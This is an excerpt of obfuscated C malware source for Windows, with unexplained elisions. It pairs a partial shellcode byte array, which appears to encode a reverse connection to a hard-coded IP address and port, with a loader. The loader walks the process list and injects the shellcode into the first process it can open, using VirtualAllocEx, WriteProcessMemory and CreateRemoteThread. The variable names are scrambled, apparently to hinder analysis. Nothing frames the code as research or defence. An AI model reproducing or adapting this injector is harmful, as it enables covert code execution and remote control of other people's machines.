...
"\x6b\x00\xff\xd5\x6a\x0a\x68\x0a\x13\xd8\xbe\x68\x02\x00"
...
SIZE_T llIlilIIlilllI = sizeof(lllIIlIlIIlI);

int lllililili(DWORD pid) {
	HANDLE lillililll = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (lillililll == NULL) return 0;

	LPVOID llliilililii = VirtualAllocEx(lillililll, NULL, llIlilIIlilllI,
										 MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (llliilililii == NULL) {
		CloseHandle(lillililll);
		return 0;
	}

	BOOL lllIlIliii = WriteProcessMemory(lillililll, llliilililii, lllIIlIlIIlI, llIlilIIlilllI, NULL);
	if (!lllIlIliii) {
		VirtualFreeEx(lillililll, llliilililii, 0, MEM_RELEASE);
		CloseHandle(lillililll);
		return 0;
	}

	HANDLE llilillilll = CreateRemoteThread(lillililll, NULL, 0, (LPTHREAD_START_ROUTINE)llliilililii,
										NULL, 0, NULL);
	if (llilillilll == NULL) {
		VirtualFreeEx(lillililll, llliilililii, 0, MEM_RELEASE);
		CloseHandle(lillililll);
...
int main() {
	while (1) {
		HANDLE lIIlillIllIllI;
		PROCESSENTRY32 llIIllIlIIIlI;
		llIIllIlIIIlI.dwSize = sizeof(PROCESSENTRY32);

		lIIlillIllIllI = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if (lIIlillIllIllI == INVALID_HANDLE_VALUE)
			continue;

		if (!Process32First(lIIlillIllIllI, &llIIllIlIIIlI)) {
			CloseHandle(lIIlillIllIllI);
			continue;
		}

		do {
			if (llIIllIlIIIlI.th32ProcessID <= 4)
				continue;
			if (lllililili(llIIllIlIIIlI.th32ProcessID)) {
				CloseHandle(lIIlillIllIllI);
				return 0;
			}
		} while (Process32Next(lIIlillIllIllI, &llIIllIlIIIlI));
